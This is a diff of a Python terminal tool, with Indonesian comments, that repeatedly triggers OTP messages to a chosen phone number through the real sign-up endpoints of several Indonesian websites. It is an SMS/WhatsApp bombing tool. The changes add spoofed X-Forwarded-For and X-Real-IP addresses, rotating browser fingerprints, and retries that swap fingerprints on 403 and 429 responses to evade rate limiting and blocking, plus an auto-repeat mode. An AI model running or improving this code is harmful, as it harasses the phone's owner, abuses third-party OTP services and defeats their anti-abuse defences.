@@ -17,9 +17,9 @@ try:
     from rich.prompt import Prompt
     from rich.align import Align
     from rich.live import Live
-    from rich.columns import Columns
     from rich import box
     from rich.rule import Rule
+    from rich.text import Text
 except ImportError:
     os.system("pip install rich -q")
     from rich.console import Console
@@ -28,9 +28,9 @@ except ImportError:
     from rich.prompt import Prompt
     from rich.align import Align
     from rich.live import Live
-    from rich.columns import Columns
     from rich import box
     from rich.rule import Rule
+    from rich.text import Text
 
 console = Console()
 
@@ -50,25 +50,50 @@ APIS = {
 }
 
 UA_POOL = [
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; vivo V25) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14; OPPO Find X6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; realme GT2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.0.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; vivo V25) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; OPPO Find X6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; realme GT2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Infinix X6816D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Tecno KG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.163 Mobile Safari/537.36",
+]
+
+SEC_CH_BRANDS = [
+    '"Not;A=Brand";v="8","Chromium";v="{v}","Google Chrome";v="{v}"',
+    '"Chromium";v="{v}","Not_A Brand";v="8","Google Chrome";v="{v}"',
+    '"Google Chrome";v="{v}","Chromium";v="{v}","Not;A=Brand";v="99"',
+    '"Not/A)Brand";v="8","Chromium";v="{v}","Google Chrome";v="{v}"',
+]
+
+FAKE_IPS = [
+    lambda: f"36.{random.randint(64,95)}.{random.randint(0,255)}.{random.randint(1,254)}",
+    lambda: f"114.{random.randint(120,130)}.{random.randint(0,255)}.{random.randint(1,254)}",
+    lambda: f"180.{random.randint(240,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+    lambda: f"103.{random.randint(1,50)}.{random.randint(0,255)}.{random.randint(1,254)}",
+    lambda: f"202.{random.randint(60,80)}.{random.randint(0,255)}.{random.randint(1,254)}",
 ]
 
 def rand_ua() -> str:
     return random.choice(UA_POOL)
+
+def rand_ip() -> str:
+    return random.choice(FAKE_IPS)()
+
+def rand_sec_ch(ver: int = None) -> str:
+    v = ver or random.choice([114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128])
+    return random.choice(SEC_CH_BRANDS).replace("{v}", str(v))
 
 BANNER = """\
 [bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
@@ -137,70 +162,139 @@ def clean_exit():
     sys.exit(0)
 
 # ══════════════════════════════════════════════════════════════
-#  API FUNCTIONS
+#  HEADERS — randomized fingerprint tiap request
 # ══════════════════════════════════════════════════════════════
 
 def _h(**extra) -> dict:
-    ua = rand_ua()
+    ua  = rand_ua()
+    ip  = rand_ip()
+    sch = rand_sec_ch()
+    # ekstrak versi chrome dari UA kalau ada
+    plat = '"Android"' if "Android" in ua else '"iOS"' if "iPhone" in ua else '"Android"'
     base = {
-        "User-Agent": ua,
-        "Accept": "application/json, text/plain, */*",
-        "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
-        "sec-ch-ua-platform": '"Android"',
-        "sec-ch-ua-mobile": "?1",
-        "accept-language": "id-ID,id;q=0.9",
+        "User-Agent":         ua,
+        "Accept":             "application/json, text/plain, */*",
+        "Accept-Encoding":    "gzip, deflate, br",
+        "Accept-Language":    random.choice([
+            "id-ID,id;q=0.9,en-US;q=0.8",
+            "id-ID,id;q=0.9",
+            "id;q=0.9,en;q=0.8",
+        ]),
+        "Connection":         "keep-alive",
+        "sec-ch-ua":          sch,
+        "sec-ch-ua-mobile":   "?1",
+        "sec-ch-ua-platform": plat,
+        "sec-fetch-dest":     "empty",
+        "sec-fetch-mode":     "cors",
+        "sec-fetch-site":     "same-site",
+        "X-Forwarded-For":    ip,
+        "X-Real-IP":          ip,
     }
     base.update(extra)
     return base
 
+# ══════════════════════════════════════════════════════════════
+#  REQUEST WRAPPER — retry on 403/429
+# ══════════════════════════════════════════════════════════════
+
+def safe_post(url: str, headers: dict, data=None, files=None,
+              timeout: int = 15, retries: int = 3) -> dict:
+    last_code = 0
+    last_body = ""
+    for attempt in range(retries):
+        try:
+            # regenerasi headers tiap attempt (fingerprint baru)
+            hdrs = dict(headers)
+            hdrs["X-Forwarded-For"] = rand_ip()
+            hdrs["X-Real-IP"]       = hdrs["X-Forwarded-For"]
+            hdrs["User-Agent"]      = rand_ua()
+            hdrs["sec-ch-ua"]       = rand_sec_ch()
+
+            if attempt > 0:
+                time.sleep(random.uniform(1.0, 2.5) * attempt)
+
+            if files:
+                r = requests.post(url, headers=hdrs, files=files, timeout=timeout)
+            else:
+                r = requests.post(url, headers=hdrs, data=data, timeout=timeout)
+
+            last_code = r.status_code
+            last_body = r.text
+
+            # sukses → langsung return
+            if is_ok(r.status_code):
+                return {"status": r.status_code, "body": r.text}
+
+            # 429 rate-limit → backoff lalu retry
+            if r.status_code == 429:
+                wait = float(r.headers.get("Retry-After", random.uniform(2, 5) * (attempt + 1)))
+                time.sleep(min(wait, 10))
+                continue
+
+            # 403 → coba sekali lagi dengan fingerprint baru
+            if r.status_code == 403:
+                time.sleep(random.uniform(0.5, 1.5))
+                continue
+
+            # kode lain → langsung return
+            return {"status": r.status_code, "body": r.text}
+
+        except requests.exceptions.Timeout:
+            last_code = 0
+            last_body = "Timeout"
+            time.sleep(1.0)
+        except Exception as e:
+            last_code = 0
+            last_body = str(e)
+            break
+
+    return {"status": last_code, "body": last_body}
+
+# ══════════════════════════════════════════════════════════════
+#  API FUNCTIONS
+# ══════════════════════════════════════════════════════════════
+
 def send_bunda(phone: str) -> dict:
-    try:
-        r = requests.post(
-            "https://cms.bunda.co.id/api/v1/auth/send-otp",
-            data=json.dumps({"phone_number": int(phone), "type": "auth"}),
-            headers=_h(**{
-                "Content-Type": "application/json", "x-locale": "id",
-                "origin": "https://www.bunda.co.id",
-                "x-requested-with": "com.chimbori.hermitcrab",
-                "referer": "https://www.bunda.co.id/id/hospitals",
-            }), timeout=15)
-        return {"status": r.status_code, "body": r.text}
-    except Exception as e:
-        return {"status": 0, "body": str(e)}
+    return safe_post(
+        "https://cms.bunda.co.id/api/v1/auth/send-otp",
+        headers=_h(**{
+            "Content-Type": "application/json",
+            "x-locale": "id",
+            "origin":    "https://www.bunda.co.id",
+            "referer":   "https://www.bunda.co.id/id/hospitals",
+            "x-requested-with": "com.chimbori.hermitcrab",
+        }),
+        data=json.dumps({"phone_number": int(phone), "type": "auth"}),
+    )
 
 def send_paper_sms(phone: str) -> dict:
-    try:
-        r = requests.post(
-            "https://register.paper.id/api/v1/auth/register/send-otp",
-            data=json.dumps({"phone": phone, "method": "sms",
-                             "registered_by": "flutter mweb"}),
-            headers=_h(**{
-                "Content-Type": "application/json", "authorization": "",
-                "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
-                "origin": "https://paper.id",
-                "x-requested-with": "com.chimbori.hermitcrab",
-                "referer": "https://paper.id/",
-            }), timeout=15)
-        return {"status": r.status_code, "body": r.text}
-    except Exception as e:
-        return {"status": 0, "body": str(e)}
+    return safe_post(
+        "https://register.paper.id/api/v1/auth/register/send-otp",
+        headers=_h(**{
+            "Content-Type": "application/json",
+            "authorization": "",
+            "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
+            "origin":  "https://paper.id",
+            "referer": "https://paper.id/",
+            "x-requested-with": "com.chimbori.hermitcrab",
+        }),
+        data=json.dumps({"phone": phone, "method": "sms",
+                         "registered_by": "flutter mweb"}),
+    )
 
 def send_planetban(phone: str) -> dict:
     num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
     pb  = "0" + num[2:]
-    try:
-        r = requests.post(
-            "https://api.planetban.com/website/customer/request-otp",
-            data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
-            headers=_h(**{
-                "Content-Type": "application/json",
-                "origin": "https://planetban.com",
-                "x-requested-with": "com.chimbori.hermitcrab",
-                "referer": "https://planetban.com/",
-            }), timeout=15)
-        return {"status": r.status_code, "body": r.text}
-    except Exception as e:
-        return {"status": 0, "body": str(e)}
+    return safe_post(
+        "https://api.planetban.com/website/customer/request-otp",
+        headers=_h(**{
+            "Content-Type": "application/json",
+            "origin":  "https://planetban.com",
+            "referer": "https://planetban.com/",
+            "x-requested-with": "com.chimbori.hermitcrab",
+        }),
+        data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
+    )
 
 def dispatch(method: str, phone: str) -> dict:
     if method == "bunda":     return send_bunda(phone)
@@ -228,11 +322,7 @@ def render_menu(phone: str = "") -> Table:
     t.add_column("CD",  width=9,  justify="center")
 
     for num, api in APIS.items():
-        if api["method"] == "all":
-            cd_txt = "[dim]each[/dim]"
-        else:
-            cd_txt = f"[dim]{api['cooldown']}s[/dim]"
-
+        cd_txt = "[dim]each[/dim]" if api["method"] == "all" else f"[dim]{api['cooldown']}s[/dim]"
         t.add_row(
             f"[cyan]{num}[/cyan]",
             f"[{api['color']}]{api['tag']}[/{api['color']}]",
@@ -279,8 +369,7 @@ def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
 
         if rem > 0 and sent:
             fill  = max(0, int((cd - rem) / cd * 14))
-            bar   = (f"[cyan]{'|' * fill}[/cyan]"
-                     f"[dim]{'.' * (14 - fill)}[/dim]")
+            bar   = f"[cyan]{'|'*fill}[/cyan][dim]{'.'*(14-fill)}[/dim]"
             sisa  = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
             ul    = datetime.fromtimestamp(sent + cd).strftime("%H:%M:%S")
             stat  = "[red] WAIT [/red]"
@@ -325,15 +414,30 @@ def wait_until_ready(phone: str, targets: list):
 #  Y / R / N  PROMPT
 # ══════════════════════════════════════════════════════════════
 
-def ask_yrn() -> str:
+def ask_yrn(before_send: bool = False) -> str:
+    """
+    before_send=True  → prompt sebelum kirim pertama (Y=kirim, R=auto-repeat, N=batal)
+    before_send=False → prompt setelah result + CD selesai
+    """
     flush_stdin()
-    console.print(Panel(
-        "  [bold cyan]Y[/bold cyan]  Kirim sekali lagi\n"
-        "  [bold cyan]R[/bold cyan]  Auto-repeat  (kirim tiap target begitu CD habis)\n"
-        "  [bold cyan]N[/bold cyan]  Stop, kembali ke menu",
-        title="[bold green]SIAP[/bold green]",
-        border_style="green", padding=(0, 2),
-    ))
+    if before_send:
+        desc = (
+            "  [bold cyan]Y[/bold cyan]  Kirim sekali\n"
+            "  [bold cyan]R[/bold cyan]  Auto-repeat  (otomatis kirim tiap CD habis)\n"
+            "  [bold cyan]N[/bold cyan]  Batal, kembali ke menu"
+        )
+        title = "[bold cyan]PILIH MODE[/bold cyan]"
+        border = "cyan"
+    else:
+        desc = (
+            "  [bold cyan]Y[/bold cyan]  Kirim sekali lagi\n"
+            "  [bold cyan]R[/bold cyan]  Auto-repeat  (otomatis kirim tiap CD habis)\n"
+            "  [bold cyan]N[/bold cyan]  Stop, kembali ke menu"
+        )
+        title = "[bold green]SIAP[/bold green]"
+        border = "green"
+
+    console.print(Panel(desc, title=title, border_style=border, padding=(0, 2)))
     while True:
         flush_stdin()
         raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
@@ -341,7 +445,7 @@ def ask_yrn() -> str:
             return raw
 
 # ══════════════════════════════════════════════════════════════
-#  RESULT PANELS
+#  RESULT PANELS  (Y mode)
 # ══════════════════════════════════════════════════════════════
 
 def show_result(api: dict, phone: str, res: dict, round_n: int):
@@ -391,36 +495,66 @@ def show_all_results(phone: str, results: list, round_n: int):
     console.print()
 
 # ══════════════════════════════════════════════════════════════
-#  R-MODE LIVE PANEL  —  in-place, tidak scroll
+#  R-MODE LIVE TABLE  — tabel sama seperti Y, update in-place
+#  stats  : { method: {"ok": int, "err": int} }
 # ══════════════════════════════════════════════════════════════
 
-def build_r_panel(phone: str, targets: list, log_rows: list, title: str) -> Panel:
-    # ── tabel log kiriman (maks 12 baris terakhir)
-    tlog = Table(box=box.SIMPLE, show_header=True, padding=(0, 1),
-                 header_style="dim cyan", show_lines=False)
-    tlog.add_column("#",      width=3,  justify="right")
-    tlog.add_column("Tag",    width=5,  justify="center")
-    tlog.add_column("API",    width=14)
-    tlog.add_column("Status", width=10)
-    tlog.add_column("Jam",    width=9,  justify="center")
+def build_r_live(phone: str, targets: list, stats: dict,
+                 last_row: dict, round_counts: dict, title: str) -> Panel:
+    """
+    Tabel utama mirip show_all_results + kolom OK/ERR count.
+    Bawahnya: CD bar per target.
+    last_row: { method: {"status": int, "time": str} } — hasil terakhir tiap target.
+    """
+    # ── tabel hasil
+    t = Table(
+        title=title,
+        box=box.ROUNDED, border_style="cyan",
+        header_style="bold cyan", show_lines=True,
+    )
+    t.add_column("Tag",    width=5,  justify="center")
+    t.add_column("API",    width=14)
+    t.add_column("Round",  width=6,  justify="center")
+    t.add_column("HTTP",   width=6,  justify="center")
+    t.add_column("Status", width=10)
+    t.add_column("OK",     width=5,  justify="center")
+    t.add_column("ERR",    width=5,  justify="center")
+    t.add_column("Jam",    width=9,  justify="center")
 
-    for row in log_rows[-12:]:
-        lbl, col = status_fmt(row["status"])
-        tlog.add_row(
-            f"[dim]{row['round']}[/dim]",
-            f"[{row['color']}]{row['tag']}[/{row['color']}]",
-            f"[{row['color']}]{row['name']}[/{row['color']}]",
+    for api in targets:
+        if api["method"] == "all":
+            continue
+        m    = api["method"]
+        lr   = last_row.get(m, {})
+        code = lr.get("status", 0)
+        ts   = lr.get("time", "--:--:--")
+        rn   = round_counts.get(m, 0)
+        lbl, col = status_fmt(code) if rn > 0 else ("--", "dim")
+
+        ok_c  = stats.get(m, {}).get("ok",  0)
+        err_c = stats.get(m, {}).get("err", 0)
+
+        ok_txt  = f"[bold green]{ok_c}[/bold green]"  if ok_c  else "[dim]0[/dim]"
+        err_txt = f"[bold red]{err_c}[/bold red]"     if err_c else "[dim]0[/dim]"
+        http_tx = f"[{col}]{code}[/{col}]"            if rn > 0 else "[dim]--[/dim]"
+
+        t.add_row(
+            f"[{api['color']}]{api['tag']}[/{api['color']}]",
+            f"[{api['color']}]{api['name']}[/{api['color']}]",
+            f"[dim]{rn}[/dim]" if rn > 0 else "[dim]--[/dim]",
+            http_tx,
             f"[{col}]{lbl}[/{col}]",
-            f"[dim]{row['time']}[/dim]",
+            ok_txt, err_txt,
+            f"[dim]{ts}[/dim]",
         )
 
-    # ── tabel CD bar
+    # ── CD bar
     tcd = Table(box=box.SIMPLE, show_header=False, padding=(0, 1),
                 show_lines=False)
-    tcd.add_column("API",    width=14)
-    tcd.add_column("Bar",    width=16)
-    tcd.add_column("Sisa",   width=8, justify="right")
-    tcd.add_column("Status", width=7, justify="center")
+    tcd.add_column("API",  width=14)
+    tcd.add_column("Bar",  width=16)
+    tcd.add_column("Sisa", width=8, justify="right")
+    tcd.add_column("St",   width=8, justify="center")
 
     for api in targets:
         if api["method"] == "all":
@@ -444,9 +578,10 @@ def build_r_panel(phone: str, targets: list, log_rows: list, title: str) -> Pane
             bar, sisa, stat,
         )
 
-    now  = datetime.now().strftime("%H:%M:%S")
-    body = Columns([tlog, tcd], padding=(0, 2))
-    return Panel(body, title=title,
+    now = datetime.now().strftime("%H:%M:%S")
+    from rich.console import Group
+    body = Group(t, Rule(style="dim"), tcd)
+    return Panel(body,
                  subtitle=f"[dim]{now}   Ctrl+C = stop[/dim]",
                  border_style="yellow", padding=(0, 1))
 
@@ -454,9 +589,15 @@ def build_r_panel(phone: str, targets: list, log_rows: list, title: str) -> Pane
 #  SESSION — SINGLE  (Y mode)
 # ══════════════════════════════════════════════════════════════
 
-def session_single(api: dict, phone: str):
+def session_single(api: dict, phone: str, first_ans: str):
+    """first_ans sudah diketahui (y atau r) sebelum kirim pertama."""
     round_n = 0
 
+    if first_ans == "r":
+        session_single_r(api, phone, round_n)
+        return
+
+    # Y mode
     while True:
         round_n += 1
         with console.status(
@@ -469,7 +610,7 @@ def session_single(api: dict, phone: str):
 
         wait_until_ready(phone, [api])
 
-        ans = ask_yrn()
+        ans = ask_yrn(before_send=False)
         if ans == "n":
             return
         if ans == "r":
@@ -477,46 +618,58 @@ def session_single(api: dict, phone: str):
             return
 
 # ══════════════════════════════════════════════════════════════
-#  SESSION — SINGLE  (R mode)  — in-place Live
+#  SESSION — SINGLE  (R mode)  — in-place Live tabel
 # ══════════════════════════════════════════════════════════════
 
 def session_single_r(api: dict, phone: str, start_round: int):
-    round_n  = start_round
-    log_rows = []
-    title    = f"[bold yellow]AUTO-REPEAT  {api['tag']}  {phone}[/bold yellow]"
+    targets      = [api]
+    round_counts = {api["method"]: start_round}
+    stats        = {api["method"]: {"ok": 0, "err": 0}}
+    last_row     = {}
+    title        = f"[bold yellow]AUTO-REPEAT  {api['tag']}  {phone}[/bold yellow]"
 
     with Live(console=console, refresh_per_second=4, transient=True) as live:
         while True:
-            round_n += 1
+            rn = round_counts[api["method"]] + 1
+            round_counts[api["method"]] = rn
+
             live.stop()
             with console.status(
-                f"[bold cyan]Auto  {api['name']}  #{round_n}...", spinner="dots",
+                f"[bold cyan]Auto  {api['name']}  #{rn}...", spinner="dots",
             ):
                 res = dispatch(api["method"], phone)
             set_cd(phone, api["method"])
             live.start()
 
-            log_rows.append({
-                "round":  round_n,
-                "tag":    api["tag"],
-                "color":  api["color"],
-                "name":   api["name"],
-                "status": res.get("status", 0),
+            code = res.get("status", 0)
+            if is_ok(code):
+                stats[api["method"]]["ok"]  += 1
+            else:
+                stats[api["method"]]["err"] += 1
+
+            last_row[api["method"]] = {
+                "status": code,
                 "time":   datetime.now().strftime("%H:%M:%S"),
-            })
-            live.update(build_r_panel(phone, [api], log_rows, title))
+            }
+            live.update(build_r_live(phone, targets, stats, last_row,
+                                     round_counts, title))
 
             while get_rem(phone, api["method"], api["cooldown"]) > 0:
                 time.sleep(0.25)
-                live.update(build_r_panel(phone, [api], log_rows, title))
+                live.update(build_r_live(phone, targets, stats, last_row,
+                                         round_counts, title))
 
 # ══════════════════════════════════════════════════════════════
 #  SESSION — ALL  (Y mode)
 # ══════════════════════════════════════════════════════════════
 
-def session_all(phone: str):
+def session_all(phone: str, first_ans: str):
     targets = [v for v in APIS.values() if v["method"] != "all"]
     round_n = 0
+
+    if first_ans == "r":
+        session_all_r(phone, targets, round_n)
+        return
 
     while True:
         round_n += 1
@@ -539,7 +692,7 @@ def session_all(phone: str):
 
         wait_until_ready(phone, targets)
 
-        ans = ask_yrn()
+        ans = ask_yrn(before_send=False)
         if ans == "n":
             return
         if ans == "r":
@@ -547,14 +700,15 @@ def session_all(phone: str):
             return
 
 # ══════════════════════════════════════════════════════════════
-#  SESSION — ALL  (R mode)  — in-place Live
+#  SESSION — ALL  (R mode)  — in-place Live tabel
 # ══════════════════════════════════════════════════════════════
 
 def session_all_r(phone: str, targets: list, initial_round: int = 0):
     round_counts = {a["method"]: initial_round for a in targets}
+    stats        = {a["method"]: {"ok": 0, "err": 0} for a in targets}
+    last_row     = {}
     pending: set = {a["method"] for a in targets
                     if not was_sent(phone, a["method"])}
-    log_rows: list = []
     title = f"[bold yellow]AUTO-REPEAT  ALL  {phone}[/bold yellow]"
 
     def needs_send(api: dict) -> bool:
@@ -581,17 +735,20 @@ def session_all_r(phone: str, targets: list, initial_round: int = 0):
                     set_cd(phone, api["method"])
                     live.start()
 
-                    log_rows.append({
-                        "round":  rn,
-                        "tag":    api["tag"],
-                        "color":  api["color"],
-                        "name":   api["name"],
-                        "status": res.get("status", 0),
+                    code = res.get("status", 0)
+                    if is_ok(code):
+                        stats[api["method"]]["ok"]  += 1
+                    else:
+                        stats[api["method"]]["err"] += 1
+
+                    last_row[api["method"]] = {
+                        "status": code,
                         "time":   datetime.now().strftime("%H:%M:%S"),
-                    })
+                    }
                     time.sleep(0.1)
 
-            live.update(build_r_panel(phone, targets, log_rows, title))
+            live.update(build_r_live(phone, targets, stats, last_row,
+                                     round_counts, title))
             time.sleep(0.25)
 
 # ══════════════════════════════════════════════════════════════
@@ -616,7 +773,6 @@ def ask_phone(current: str = "") -> str:
 # ══════════════════════════════════════════════════════════════
 
 def main():
-    # Ctrl+C sekali = langsung keluar bersih, tanpa loop balik ke menu
     signal.signal(signal.SIGINT, lambda sig, frm: clean_exit())
 
     current_phone = ""
@@ -651,10 +807,10 @@ def main():
         current_phone = ask_phone(current_phone)
         console.print()
 
-        # Cek CD awal
         targets = ([v for v in APIS.values() if v["method"] != "all"]
                    if api["method"] == "all" else [api])
 
+        # Cek CD awal
         locked = [a for a in targets
                   if get_rem(current_phone, a["method"], a["cooldown"]) > 0]
 
@@ -664,7 +820,7 @@ def main():
                                title="[bold red]COOLDOWN AKTIF[/bold red]")
             ))
             console.print(
-                "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu kirim"
+                "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu pilih mode"
                 "\n  [bold cyan]N[/bold cyan] = Batal\n"
             )
             flush_stdin()
@@ -674,11 +830,16 @@ def main():
                 continue
             wait_until_ready(current_phone, targets)
 
-        # Mulai sesi
+        # ── Pilih Y/R/N SEBELUM kirim pertama
+        first_ans = ask_yrn(before_send=True)
+        if first_ans == "n":
+            continue
+
+        # Mulai sesi dengan mode yang sudah dipilih
         if api["method"] == "all":
-            session_all(current_phone)
+            session_all(current_phone, first_ans)
         else:
-            session_single(api, current_phone)
+            session_single(api, current_phone, first_ans)
 
         time.sleep(0.4)
 
